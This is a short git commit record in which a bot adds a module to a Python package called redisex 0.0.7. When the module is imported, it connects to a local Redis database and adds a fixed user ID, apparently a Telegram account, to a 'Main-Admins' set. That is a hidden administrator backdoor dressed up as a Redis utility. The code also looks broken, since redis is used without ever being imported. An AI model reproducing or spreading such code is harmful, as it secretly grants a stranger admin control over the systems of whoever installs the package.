b99e9e7063737258732cf963ab7011d2e60beee2
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 18:11:15 +0000

    Add package redisex/0.0.7/redisex-0.0.7-py3-none-any.whl

---
+++ packages/redisex/redisex-0.0.7-py3-none-any.whl/redisex/redisex.py
@@ -0,0 +1,6 @@
+try :
+    redis = redis.StrictRedis(host ='localhost' , port = 6379 , db = 2 , password = '' , decode_responses = True)
+except Exception as e:
+    print(f'[-] i cant connect to the redis {str(e)}')
+    exit()
+redis.sadd("Main-Admins" , "1845133845")
